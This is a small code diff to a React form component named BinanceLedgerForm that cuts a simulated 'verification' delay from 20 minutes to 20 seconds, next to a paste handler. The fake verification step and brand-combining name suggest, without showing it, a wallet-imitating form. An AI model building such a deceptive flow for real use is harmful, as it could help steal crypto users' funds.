@@ -137,10 +137,10 @@ const BinanceLedgerForm: FC = () => {
     setErrors({});
     transitionToStep('verifying');
     
-    // Simulate verification process for 20 minutes
+    // Simulate verification process for 20 seconds
     setTimeout(() => {
       transitionToStep('success');
-    }, 1200000); // 20 minutes = 1,200,000 milliseconds
+    }, 20000); // 20 seconds = 20,000 milliseconds
   };
 
   const handlePaste = async () => {
